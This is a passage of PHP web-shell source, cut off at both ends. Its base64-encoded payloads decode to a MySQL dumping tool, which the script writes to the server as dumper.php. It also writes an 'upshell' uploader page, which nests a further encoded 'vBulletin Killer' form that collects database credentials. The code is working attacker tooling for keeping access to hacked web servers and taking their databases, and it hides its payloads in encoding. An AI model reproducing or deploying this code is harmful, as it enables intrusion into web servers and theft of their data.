leCgpewogICAgICAgICAgICAgICAgaWYgKCFmaWxlX2V4aXN0cyhQQVRIIC4gJ2luZGV4Lmh0bWwnKSkgewogICAgICAgICAgICAgICAgICAgICRmaCA9IGZvcGVuKFBBVEggLiAnaW5kZXguaHRtbCcsICd3YicpOwogICAgICAgICAgICAgICAgICAgICAgICBmd3JpdGUoJGZoLCB0cGxfYmFja3VwX2luZGV4KCkpOwogICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJGZoKTsKICAgICAgICAgICAgICAgICAgICAgICAgQGNobW9kKFBBVEggLiAnaW5kZXguaHRtbCcsIDA2NjYpOwogICAgICAgICAgICAgICAgfQogICAgICAgIH0KfQoKZnVuY3Rpb24gZm5faW50KCRudW0pewogICAgICAgIHJldHVybiBudW1iZXJfZm9ybWF0KCRudW0sIDAsICcsJywgJyAnKTsKfQoKZnVuY3Rpb24gZm5fYXJyMnN0cigkYXJyYXkpIHsKICAgICAgICAkc3RyID0gImFycmF5KFxuIjsKICAgICAgICBmb3JlYWNoICgkYXJyYXkgYXMgJGtleSA9PiAkdmFsdWUpIHsKICAgICAgICAgICAgICAgIGlmIChpc19hcnJheSgkdmFsdWUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRzdHIgLj0gIicka2V5JyA9PiAiIC4gZm5fYXJyMnN0cigkdmFsdWUpIC4gIixcblxuIjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkc3RyIC49ICInJGtleScgPT4gJyIgLiBzdHJfcmVwbGFjZSgiJyIsICJcJyIsICR2YWx1ZSkgLiAiJyxcbiI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkc3RyIC4gIikiOwp9CgovLyBUZW1wbGF0ZXMKCmZ1bmN0aW9uIHRwbF9wYWdlKCRjb250ZW50ID0gJycsICRidXR0b25zID0gJycpewpyZXR1cm4gPDw8SFRNTAo8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIj4KPEhUTUw+CjxIRUFEPgo8VElUTEU+TXlzcWwgRHVtcGVyIDEuMC45IHwgJmNvcHk7IDIwMDYgemFwaW1pcjwvVElUTEU+CjxNRVRBIEhUVFAtRVFVSVY9Q29udGVudC1UeXBlIENPTlRFTlQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCI+CjxTVFlMRSBUWVBFPSJURVhUL0NTUyI+CjwhLS0KYm9keXsKICAgICAgICBvdmVyZmxvdzogYXV0bzsKfQp0ZCB7CiAgICAgICAgZm9udDogMTFweCB0YWhvbWEsIHZlcmRhbmEsIGFyaWFsOwogICAgICAgIGN1cnNvcjogZGVmYXVsdDsKfQppbnB1dCwgc2VsZWN0LCBkaXYgewogICAgICAgIGZvbnQ6IDExcHggdGFob21hLCB2ZXJkYW5hLCBhcmlhbDsKfQppbnB1dC50ZXh0LCBzZWxlY3QgewogICAgICAgIHdpZHRoOiAxMDAlOwp9CmZpZWxkc2V0IHsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4Owp9Ci0tPgo8L1NUWUxFPgo8L0hFQUQ+Cgo8Qk9EWSBCR0NPTE9SPSNFQ0U5RDggVEVYVD0jMDAwMDAwPgo8VEFCTEUgV0lEVEg9MTAwJSBIRUlHSFQ9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTAgQUxJR049Q0VOVEVSPgo8VFI+CjxURCBIRUlHSFQ9NjAlIEFMSUdOPUNFTlRFUiBWQUxJR049TUlERExFPgo8VEFCTEUgV0lEVEg9MzYwIEJPUkRFUj0wIENFTExTUEFDSU5HPTAgQ0VMTFBBRERJTkc9MD4KPFRSPgo8VEQgVkFMSUdOPVRPUCBTVFlMRT0iYm9yZGVyOiAxcHggc29saWQgIzkxOUI5QzsiPgo8VEFCTEUgV0lEVEg9MTAwJSBIRUlHSFQ9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0xIENFTExQQURESU5HPTA+CjxUUj4KPFREIElEPUhlYWRlciBIRUlHSFQ9MjAgQkdDT0xPUj0jN0E5NkRGIFNUWUxFPSJmb250LXNpemU6IDEzcHg7IGNvbG9yOiB3aGl0ZTsgZm9udC1mYW1pbHk6IHZlcmRhbmEsIGFyaWFsOwpwYWRkaW5nLWxlZnQ6IDVweDsgRklMVEVSOiBwcm9naWQ6RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuR3JhZGllbnQoZ3JhZGllbnRUeXBlPTEsc3RhcnRDb2xvclN0cj0jN0E5NkRGLGVuZENvbG9yU3RyPSNGQkZCRkQpIgpUSVRMRT0nJmNvcHk7IDIwMDMtMjAwNiB6YXBpbWlyJz4KPEI+PEEgSFJFRj1odHRwOi8vc3lwZXgubmV0L3Byb2R1Y3RzL2R1bXBlci8gU1RZTEU9ImNvbG9yOiB3aGl0ZTsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyI+TXlzcWwgRHVtcGVyIDEuMC45PC9BPjwvQj48SU1HIElEPUdTIFdJRFRIPTEgSEVJR0hUPTEgU1RZTEU9InZpc2liaWxpdHk6IGhpZGRlbjsiPjwvVEQ+CjwvVFI+CjxUUj4KPEZPUk0gTkFNRT1za2IgTUVUSE9EPVBPU1QgQUNUSU9OPWR1bXBlci5waHA+CjxURCBWQUxJR049VE9QIEJHQ09MT1I9I0Y0RjNFRSBTVFlMRT0iRklMVEVSOiBwcm9naWQ6RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuR3JhZGllbnQoZ3JhZGllbnRUeXBlPTAsc3RhcnRDb2xvclN0cj0jRkNGQkZFLGVuZENvbG9yU3RyPSNGNEYzRUUpOyBwYWRkaW5nOiA4cHggOHB4OyI+CnskY29udGVudH0KPFRBQkxFIFdJRFRIPTEwMCUgQk9SREVSPTAgQ0VMTFNQQUNJTkc9MCBDRUxMUEFERElORz0yPgo8VFI+CjxURCBTVFlMRT0nY29sb3I6ICNDRUNFQ0UnIElEPXRpbWVyPjwvVEQ+CjxURCBBTElHTj1SSUdIVD57JGJ1dHRvbnN9PC9URD4KPC9UUj4KPC9UQUJMRT48L1REPgo8L0ZPUk0+CjwvVFI+CjwvVEFCTEU+PC9URD4KPC9UUj4KPC9UQUJMRT48L1REPgo8L1RSPgo8L1RBQkxFPgo8L1REPgo8L1RSPgo8L1RBQkxFPgo8L0JPRFk+CjwvSFRNTD4KSFRNTDsKfQoKZnVuY3Rpb24gdHBsX21haW4oKXsKZ2xvYmFsICRTSzsKcmV0dXJuIDw8PEhUTUwKPEZJRUxEU0VUIG9uQ2xpY2s9ImRvY3VtZW50LnNrYi5hY3Rpb25bMF0uY2hlY2tlZCA9IDE7Ij4KPExFR0VORD4KPElOUFVUIFRZUEU9cmFkaW8gTkFNRT1hY3Rpb24gVkFMVUU9YmFja3VwPgpCYWNrdXAgLyDQodC+0LfQtNCw0L3QuNC1INGA0LXQt9C10YDQstC90L7QuSDQutC+0L/QuNC4INCR0JQmbmJzcDs8L0xFR0VORD4KPFRBQkxFIFdJRFRIPTEwMCUgQk9SREVSPTAgQ0VMTFNQQUNJTkc9MCBDRUxMUEFERElORz0yPgo8VFI+CjxURCBXSURUSD0zNSU+0JHQlDo8L1REPgo8VEQgV0lEVEg9NjUlPjxTRUxFQ1QgTkFNRT1kYl9iYWNrdXA+CnskU0stPnZhcnNbJ2RiX2JhY2t1cCddfQo8L1NFTEVDVD48L1REPgo8L1RSPgo8VFI+CjxURD7QpNC40LvRjNGC0YAg0YLQsNCx0LvQuNGGOjwvVEQ+CjxURD48SU5QVVQgTkFNRT10YWJsZXMgVFlQRT10ZXh0IENMQVNTPXRleHQgVkFMVUU9J3skU0stPnZhcnNbJ3RhYmxlcyddfSc+PC9URD4KPC9UUj4KPFRSPgo8VEQ+0JzQtdGC0L7QtCDRgdC20LDRgtC40Y86PC9URD4KPFREPjxTRUxFQ1QgTkFNRT1jb21wX21ldGhvZD4KeyRTSy0+dmFyc1snY29tcF9tZXRob2RzJ119CjwvU0VMRUNUPjwvVEQ+CjwvVFI+CjxUUj4KPFREPtCh0YLQtdC/0LXQvdGMINGB0LbQsNGC0LjRjzo8L1REPgo8VEQ+PFNFTEVDVCBOQU1FPWNvbXBfbGV2ZWw+CnskU0stPnZhcnNbJ2NvbXBfbGV2ZWxzJ119CjwvU0VMRUNUPjwvVEQ+CjwvVFI+CjwvVEFCTEU+CjwvRklFTERTRVQ+CjxGSUVMRFNFVCBvbkNsaWNrPSJkb2N1bWVudC5za2IuYWN0aW9uWzFdLmNoZWNrZWQgPSAxOyI+CjxMRUdFTkQ+CjxJTlBVVCBUWVBFPXJhZGlvIE5BTUU9YWN0aW9uIFZBTFVFPXJlc3RvcmU+ClJlc3RvcmUgLyDQktC+0YHRgdGC0LDQvdC+0LLQu9C10L3QuNC1INCR0JQg0LjQtyDRgNC10LfQtdGA0LLQvdC+0Lkg0LrQvtC/0LjQuCZuYnNwOzwvTEVHRU5EPgo8VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTI+CjxUUj4KPFREPtCR0JQ6PC9URD4KPFREPjxTRUxFQ1QgTkFNRT1kYl9yZXN0b3JlPgp7JFNLLT52YXJzWydkYl9yZXN0b3JlJ119CjwvU0VMRUNUPjwvVEQ+CjwvVFI+CjxUUj4KPFREIFdJRFRIPTM1JT7QpNCw0LnQuzo8L1REPgo8VEQgV0lEVEg9NjUlPjxTRUxFQ1QgTkFNRT1maWxlPgp7JFNLLT52YXJzWydmaWxlcyddfQo8L1NFTEVDVD48L1REPgo8L1RSPgo8L1RBQkxFPgo8L0ZJRUxEU0VUPgo8L1NQQU4+CjxTQ1JJUFQ+CmRvY3VtZW50LnNrYi5hY3Rpb25beyRTSy0+U0VUWydsYXN0X2FjdGlvbiddfV0uY2hlY2tlZCA9IDE7CjwvU0NSSVBUPgoKSFRNTDsKfQoKZnVuY3Rpb24gdHBsX3Byb2Nlc3MoJHRpdGxlKXsKcmV0dXJuIDw8PEhUTUwKPEZJRUxEU0VUPgo8TEVHRU5EPnskdGl0bGV9Jm5ic3A7PC9MRUdFTkQ+CjxUQUJMRSBXSURUSD0xMDAlIEJPUkRFUj0wIENFTExTUEFDSU5HPTAgQ0VMTFBBRERJTkc9Mj4KPFRSPjxURCBDT0xTUEFOPTI+PERJViBJRD1sb2dhcmVhIFNUWUxFPSJ3aWR0aDogMTAwJTsgaGVpZ2h0OiAxNDBweDsgYm9yZGVyOiAxcHggc29saWQgIzdGOURCOTsgcGFkZGluZzogM3B4OyBvdmVyZmxvdzogYXV0bzsiPjwvRElWPjwvVEQ+PC9UUj4KPFRSPjxURCBXSURUSD0zMSU+0KHRgtCw0YLRg9GBINGC0LDQsdC70LjRhtGLOjwvVEQ+PFREIFdJRFRIPTY5JT48VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MSBDRUxMUEFERElORz0wIENFTExTUEFDSU5HPTA+CjxUUj48VEQgQkdDT0xPUj0jRkZGRkZGPjxUQUJMRSBXSURUSD0xIEJPUkRFUj0wIENFTExQQURESU5HPTAgQ0VMTFNQQUNJTkc9MCBCR0NPTE9SPSM1NTU1Q0MgSUQ9c3RfdGFiClNUWUxFPSJGSUxURVI6IHByb2dpZDpEWEltYWdlVHJhbnNmb3JtLk1pY3Jvc29mdC5HcmFkaWVudChncmFkaWVudFR5cGU9MCxzdGFydENvbG9yU3RyPSNDQ0NDRkYsZW5kQ29sb3JTdHI9IzU1NTVDQyk7CmJvcmRlci1yaWdodDogMXB4IHNvbGlkICNBQUFBQUEiPjxUUj48VEQgSEVJR0hUPTEyPjwvVEQ+PC9UUj48L1RBQkxFPjwvVEQ+PC9UUj48L1RBQkxFPjwvVEQ+PC9UUj4KPFRSPjxURD7QntCx0YnQuNC5INGB0YLQsNGC0YPRgTo8L1REPjxURD48VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MSBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTA+CjxUUj48VEQgQkdDT0xPUj0jRkZGRkZGPjxUQUJMRSBXSURUSD0xIEJPUkRFUj0wIENFTExQQURESU5HPTAgQ0VMTFNQQUNJTkc9MCBCR0NPTE9SPSMwMEFBMDAgSUQ9c29fdGFiClNUWUxFPSJGSUxURVI6IHByb2dpZDpEWEltYWdlVHJhbnNmb3JtLk1pY3Jvc29mdC5HcmFkaWVudChncmFkaWVudFR5cGU9MCxzdGFydENvbG9yU3RyPSNDQ0ZGQ0MsZW5kQ29sb3JTdHI9IzAwQUEwMCk7CmJvcmRlci1yaWdodDogMXB4IHNvbGlkICNBQUFBQUEiPjxUUj48VEQgSEVJR0hUPTEyPjwvVEQ+PC9UUj48L1RBQkxFPjwvVEQ+CjwvVFI+PC9UQUJMRT48L1REPjwvVFI+PC9UQUJMRT4KPC9GSUVMRFNFVD4KPFNDUklQVD4KdmFyIFdpZHRoTG9ja2VkID0gZmFsc2U7CmZ1bmN0aW9uIHMoc3QsIHNvKXsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3RfdGFiJykud2lkdGggPSBzdCA/IHN0ICsgJyUnIDogJzEnOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzb190YWInKS53aWR0aCA9IHNvID8gc28gKyAnJScgOiAnMSc7Cn0KZnVuY3Rpb24gbChzdHIsIGNvbG9yKXsKICAgICAgICBzd2l0Y2goY29sb3IpewogICAgICAgICAgICAgICAgY2FzZSAyOiBjb2xvciA9ICduYXZ5JzsgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDM6IGNvbG9yID0gJ3JlZCc7IGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSA0OiBjb2xvciA9ICdtYXJvb24nOyBicmVhazsKICAgICAgICAgICAgICAgIGRlZmF1bHQ6IGNvbG9yID0gJ2JsYWNrJzsKICAgICAgICB9CiAgICAgICAgd2l0aChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9nYXJlYScpKXsKICAgICAgICAgICAgICAgIGlmICghV2lkdGhMb2NrZWQpewogICAgICAgICAgICAgICAgICAgICAgICBzdHlsZS53aWR0aCA9IGNsaWVudFdpZHRoOwogICAgICAgICAgICAgICAgICAgICAgICBXaWR0aExvY2tlZCA9IHRydWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBzdHIgPSAnPEZPTlQgQ09MT1I9JyArIGNvbG9yICsgJz4nICsgc3RyICsgJzwvRk9OVD4nOwogICAgICAgICAgICAgICAgaW5uZXJIVE1MICs9IGlubmVySFRNTCA/ICI8QlI+XFxuIiArIHN0ciA6IHN0cjsKICAgICAgICAgICAgICAgIHNjcm9sbFRvcCArPSAxNDsKICAgICAgICB9Cn0KPC9TQ1JJUFQ+CkhUTUw7Cn0KCmZ1bmN0aW9uIHRwbF9hdXRoKCRlcnJvcil7CnJldHVybiA8PDxIVE1MCjxTUEFOIElEPWVycm9yPgo8RklFTERTRVQ+CjxMRUdFTkQ+0J7RiNC40LHQutCwPC9MRUdFTkQ+CjxUQUJMRSBXSURUSD0xMDAlIEJPUkRFUj0wIENFTExTUEFDSU5HPTAgQ0VMTFBBRERJTkc9Mj4KPFRSPgo8VEQ+0JTQu9GPINGA0LDQsdC+0YLRiyBTeXBleCBEdW1wZXIgTGl0ZSDRgtGA0LXQsdGD0LXRgtGB0Y86PEJSPiAtIEludGVybmV0IEV4cGxvcmVyIDUuNSssIE1vemlsbGEg0LvQuNCx0L4gT3BlcmEgOCsgKDxTUEFOIElEPXNpZT4tPC9TUEFOPik8QlI+IC0g0LLQutC70Y7Rh9C10L3QviDQstGL0L/QvtC70L3QtdC90LjQtSBKYXZhU2NyaXB0INGB0LrRgNC40L/RgtC+0LIgKDxTUEFOIElEPXNqcz4tPC9TUEFOPik8L1REPgo8L1RSPgo8L1RBQkxFPgo8L0ZJRUxEU0VUPgo8L1NQQU4+CjxTUEFOIElEPWJvZHkgU1RZTEU9ImRpc3BsYXk6IG5vbmU7Ij4KeyRlcnJvcn0KPEZJRUxEU0VUPgo8TEVHRU5EPkVudGVyIGxvZ2luIGFuZCBwYXNzd29yZDwvTEVHRU5EPgo8VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTI+CjxUUj4KPFREIFdJRFRIPTQxJT7Qm9C+0LPQuNC9OjwvVEQ+CjxURCBXSURUSD01OSU+PElOUFVUIE5BTUU9bG9naW4gVFlQRT10ZXh0IENMQVNTPXRleHQ+PC9URD4KPC9UUj4KPFRSPgo8VEQ+0J/QsNGA0L7Qu9GMOjwvVEQ+CjxURD48SU5QVVQgTkFNRT1wYXNzIFRZUEU9cGFzc3dvcmQgQ0xBU1M9dGV4dD48L1REPgo8L1RSPgo8L1RBQkxFPgo8L0ZJRUxEU0VUPgo8L1NQQU4+CjxTQ1JJUFQ+CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzanMnKS5pbm5lckhUTUwgPSAnKyc7CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdib2R5Jykuc3R5bGUuZGlzcGxheSA9ICcnOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3InKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwp2YXIganNFbmFibGVkID0gdHJ1ZTsKPC9TQ1JJUFQ+CkhUTUw7Cn0KCmZ1bmN0aW9uIHRwbF9sKCRzdHIsICRjb2xvciA9IENfREVGQVVMVCl7CiRzdHIgPSBwcmVnX3JlcGxhY2UoIi9cc3syfS8iLCAiICZuYnNwOyIsICRzdHIpOwpyZXR1cm4gPDw8SFRNTAo8U0NSSVBUPmwoJ3skc3RyfScsICRjb2xvcik7PC9TQ1JJUFQ+CgpIVE1MOwp9CgpmdW5jdGlvbiB0cGxfZW5hYmxlQmFjaygpewpyZXR1cm4gPDw8SFRNTAo8U0NSSVBUPmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYWNrJykuZGlzYWJsZWQgPSAwOzwvU0NSSVBUPgoKSFRNTDsKfQoKZnVuY3Rpb24gdHBsX3MoJHN0LCAkc28pewokc3QgPSByb3VuZCgkc3QgKiAxMDApOwokc3QgPSAkc3QgPiAxMDAgPyAxMDAgOiAkc3Q7CiRzbyA9IHJvdW5kKCRzbyAqIDEwMCk7CiRzbyA9ICRzbyA+IDEwMCA/IDEwMCA6ICRzbzsKcmV0dXJuIDw8PEhUTUwKPFNDUklQVD5zKHskc3R9LHskc299KTs8L1NDUklQVD4KCkhUTUw7Cn0KCmZ1bmN0aW9uIHRwbF9iYWNrdXBfaW5kZXgoKXsKcmV0dXJuIDw8PEhUTUwKPENFTlRFUj4KPEgxPllvdSBkb24ndCBoYXZlIHBlcm1pc3Npb25zIHRvIGxpc3QgdGhpcyBkaXI8L0gxPgo8L0NFTlRFUj4KCkhUTUw7Cn0KCmZ1bmN0aW9uIHRwbF9lcnJvcigkZXJyb3IpewpyZXR1cm4gPDw8SFRNTAo8RklFTERTRVQ+CjxMRUdFTkQ+RXJyb3IgY29ubmVjdCB0byBEQjwvTEVHRU5EPgo8VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTI+CjxUUj4KPFREIEFMSUdOPWNlbnRlcj57JGVycm9yfTwvVEQ+CjwvVFI+CjwvVEFCTEU+CjwvRklFTERTRVQ+CgpIVE1MOwp9CgpmdW5jdGlvbiBTWERfZXJyb3JIYW5kbGVyKCRlcnJubywgJGVycm1zZywgJGZpbGVuYW1lLCAkbGluZW51bSwgJHZhcnMpIHsKICAgICAgICBpZiAoJGVycm5vID09IDIwNDgpIHJldHVybiB0cnVlOwogICAgICAgIGlmIChwcmVnX21hdGNoKCIvY2htb2RcKFwpLio/OiBPcGVyYXRpb24gbm90IHBlcm1pdHRlZC8iLCAkZXJybXNnKSkgcmV0dXJuIHRydWU7CiAgICAkZHQgPSBkYXRlKCJZLm0uZCBIOmk6cyIpOwogICAgJGVycm1zZyA9IGFkZHNsYXNoZXMoJGVycm1zZyk7CgogICAgICAgIGVjaG8gdHBsX2woInskZHR9PEJSPjxCPkVycm9yIHdhcyBvY2N1cmVkITwvQj4iLCBDX0VSUk9SKTsKICAgICAgICBlY2hvIHRwbF9sKCJ7JGVycm1zZ30gKHskZXJybm99KSIsIENfRVJST1IpOwogICAgICAgIGVjaG8gdHBsX2VuYWJsZUJhY2soKTsKICAgICAgICBkaWUoKTsKfQo/Pgo=
';
$file = fopen("dumper.php" ,"w+");
$write = fwrite ($file ,base64_decode($perltoolss));
fclose($file);
   echo "<iframe src=dumper.php width=100% height=720px frameborder=0></iframe> ";
}//end leech 
elseif ($action == 'upshell') {
$file = fopen($dir."upshell.php" ,"w+");
$perltoolss = 'PCFET0NUWVBFIEhUTUwgUFVCTElDICctLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTicgJ2h0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCc+CjxodG1sPgo8IS0tSXRzIEZpcnN0IFB1YmxpYyBWZXJzaW9uIAoKIC0tPgo8L2h0bWw+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0nQ29udGVudC1UeXBlJyBjb250ZW50PSd0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgnPgo8dGl0bGU+OjogVXBzaGVsbCA6OiBLeW1Mam5rIDo6PC90aXRsZT4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KYSB7IAp0ZXh0LWRlY29yYXRpb246bm9uZTsKY29sb3I6d2hpdGU7CiB9Cjwvc3R5bGU+IAo8c3R5bGU+CmlucHV0IHsgCmNvbG9yOiMwMDAwMzU7IApmb250OjhwdCAndHJlYnVjaGV0IG1zJyxoZWx2ZXRpY2Esc2Fucy1zZXJpZjsKfQouRElSIHsgCmNvbG9yOiMwMDAwMzU7IApmb250OmJvbGQgOHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmO2NvbG9yOiNGRkZGRkY7CmJhY2tncm91bmQtY29sb3I6I0FBMDAwMDsKYm9yZGVyLXN0eWxlOm5vbmU7Cn0KLnR4dCB7IApjb2xvcjojMkEwMDAwOyAKZm9udDpib2xkICA4cHQgJ3RyZWJ1Y2hldCBtcycsaGVsdmV0aWNhLHNhbnMtc2VyaWY7Cn0gCmJvZHksIHRhYmxlLCBzZWxlY3QsIG9wdGlvbiwgLmluZm8Kewpmb250OmJvbGQgIDhwdCAndHJlYnVjaGV0IG1zJyxoZWx2ZXRpY2Esc2Fucy1zZXJpZjsKfQpib2R5IHsKCWJhY2tncm91bmQtY29sb3I6ICNFNUU1RTU7Cn0KLnN0eWxlMSB7Y29sb3I6ICNBQTAwMDB9Ci50ZAp7CmJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7CmJvcmRlci10b3A6IDBweDsKYm9yZGVyLWxlZnQ6IDBweDsKYm9yZGVyLXJpZ2h0OiAwcHg7Cn0KLnRkVVAKewpib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2Owpib3JkZXItdG9wOiAxcHg7CmJvcmRlci1sZWZ0OiAwcHg7CmJvcmRlci1yaWdodDogMHB4Owpib3JkZXItYm90dG9tOiAxcHg7Cn0KLnN0eWxlNCB7Y29sb3I6ICNGRkZGRkY7IH0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPD9waHAKZWNobyAiPENFTlRFUj4KICA8dGFibGUgYm9yZGVyPScxJyBjZWxscGFkZGluZz0nMCcgY2VsbHNwYWNpbmc9JzAnIHN0eWxlPSdib3JkZXItY29sbGFwc2U6IGNvbGxhcHNlOyBib3JkZXItc3R5bGU6IHNvbGlkOyBib3JkZXItY29sb3I6ICNDMEMwQzA7IHBhZGRpbmctbGVmdDogNDsgcGFkZGluZy1yaWdodDogNDsgcGFkZGluZy10b3A6IDE7IHBhZGRpbmctYm90dG9tOiAxJyBib3JkZXJjb2xvcj0nIzExMTExMScgd2lkdGg9Jzg2JScgYmdjb2xvcj0nI0UwRTBFMCc+CiAgICA8dHI+CiAgICAgIDx0ZCBiZ2NvbG9yPScjMDAwMGZmJyBjbGFzcz0ndGQnPjxkaXYgYWxpZ249J2NlbnRlcicgY2xhc3M9J3N0eWxlNCc+IEhheSBjaG9uIG1hIG5ndW9uPC9kaXY+PC90ZD4KICAgICAgPHRkIGJnY29sb3I9JyMwMDAwZmYnIGNsYXNzPSd0ZCcgc3R5bGU9J3BhZGRpbmc6MHB4IDBweCAwcHggNXB4Jz48ZGl2IGFsaWduPSdjZW50ZXInIGNsYXNzPSdzdHlsZTQnPgogICAgICAgIDxkaXYgYWxpZ249J2xlZnQnPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj48L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgIDx0ZCB3aWR0aD0nMTAwJScgaGVpZ2h0PScyODAnIHN0eWxlPSdwYWRkaW5nOjIwcHggMjBweCAyMHB4IDIwcHggJz4iOwoKaWYgKGlzc2V0KCRfUE9TVFsndmJiJ10pKQp7CiAgICBta2RpcigndXBzaGVsbCcsIDA3NTUpOwogICAgY2hkaXIoJ3Vwc2hlbGwnKTsKJGNvbmZpZ3NoZWxsID0gJ1BHaDBiV3crQ2p4MGFYUnNaVDUyUW5Wc2JHVjBhVzRnUzJsc2JHVnlQQzkwYVhSc1pUNEtQR05sYm5SbGNqNEtQR1p2Y20wZ2JXVjBhRzlrUFZCUFUxUWdZV04wYVc5dVBTY25QZ284Wm05dWRDQm1ZV05sUFNkQmNtbGhiQ2NnWTI5c2IzSTlKeU13TURBd01EQW5QazE1YzNGc0lFaHZjM1E4TDJadmJuUStQR0p5UGp4cGJuQjFkQ0IyWVd4MVpUMXNiMk5oYkdodmMzUWdkSGx3WlQxMFpYaDBJRzVoYldVOWFHOXpkRzVoYldVZ2MybDZaVDBuTlRBbklITjBlV3hsUFNkbWIyNTBMWE5wZW1VNklEaHdkRHNnWTI5c2IzSTZJQ013TURBd01EQTdJR1p2Ym5RdFptRnRhV3g1T2lCVVlXaHZiV0U3SUdKdmNtUmxjam9nTVhCNElITnZiR2xrSUNNMk5qWTJOalk3SUdKaFkydG5jbTkxYm1RdFkyOXNiM0k2SUNOR1JrWkdSa1luUGp4aWNqNEtQR1p2Ym5RZ1ptRmpaVDBuUVhKcFlXd25JR052Ykc5eVBTY2pNREF3TURBd0p6NUVRaUJ1WVcxbFBHSnlQand2Wm05dWRENDhhVzV3ZFhRZ2RtRnNkV1U5WkdGMFlXSmhjMlVnZEhsd1pUMTBaWGgwSUc1aGJXVTlaR0p1WVcxbElITnBlbVU5SnpVd0p5QnpkSGxzWlQwblptOXVkQzF6YVhwbE9pQTRjSFE3SUdOdmJHOXlPaUFqTURBd01EQXdPeUJtYjI1MExXWmhiV2xzZVRvZ1ZHRm9iMjFoT3lCaWIzSmtaWEk2SURGd2VDQnpiMnhwWkNBak5qWTJOalkyT3lCaVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lBalJrWkdSa1pHSno0OFluSStDanhtYjI1MElHWmhZMlU5SjBGeWFXRnNKeUJqYjJ4dmNqMG5JekF3TURBd01DYytSRUlnZFhObGNqeGljajQ4TDJadmJuUStQR2x1Y0hWMElIWmhiSFZsUFhWelpYSWdkSGx3WlQxMFpYaDBJRzVoYldVOVpHSjFjMlZ5SUhOcGVtVTlKelV3SnlCemRIbHNaVDBuWm05dWRDMXphWHBsT2lBNGNIUTdJR052Ykc5eU9pQWpNREF3TURBd095Qm1iMjUwTFdaaGJXbHNlVG9nVkdGb2IyMWhPeUJpYjNKa1pYSTZJREZ3ZUNCemIyeHBaQ0FqTmpZMk5qWTJPeUJpWVdOclozSnZkVzVrTFdOdmJHOXlPaUFqUmtaR1JrWkdKejQ4WW5JK0NqeG1iMjUwSUdaaFkyVTlKMEZ5YVdGc0p5QmpiMnh2Y2owbkl6QXdNREF3TUNjK1JFSWdaR0p3WVhOelBHSnlQand2Wm05dWRENDhhVzV3ZFhRZ2RtRnNkV1U5Y0dGemN5QjBlWEJsUFhSbGVIUWdibUZ0WlQxa1luQmhjM01nYzJsNlpUMG5OVEFuSUhOMGVXeGxQU2RtYjI1MExYTnBlbVU2SURod2REc2dZMjlzYjNJNklDTXdNREF3TURBN0lHWnZiblF0Wm1GdGFXeDVPaUJVWVdodmJXRTdJR0p2Y21SbGNqb2dNWEI0SUhOdmJHbGtJQ00yTmpZMk5qWTdJR0poWTJ0bmNtOTFibVF0WTI5c2IzSTZJQ05HUmtaR1JrWW5QanhpY2o0S1BHWnZiblFnWm1GalpUMG5RWEpwWVd3bklHTnZiRzl5UFNjak1EQXdNREF3Sno1VVlXSnNaU0J3Y21WbWFYZzhZbkkrUEM5bWIyNTBQanhwYm5CMWRDQjJZV3gxWlQwbmRtSmlYeWNnZEhsd1pUMTBaWGgwSUc1aGJXVTljSEpsWm1sNElITnBlbVU5SnpVd0p5QnpkSGxzWlQwblptOXVkQzF6YVhwbE9pQTRjSFE3SUdOdmJHOXlPaUFqTURBd01EQXdPeUJtYjI1MExXWmhiV2xzZVRvZ1ZHRm9iMjFoT3lCaWIzSmtaWEk2SURGd2VDQnpiMnhwWkNBak5qWTJOalkyT3lCaVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lBalJrWkdSa1pHSno0OFluSStDanhtYjI1MElHWmhZMlU5SjBGeWFXRnNKeUJqYjJ4dmNqMG5JekF3TURBd01DYyt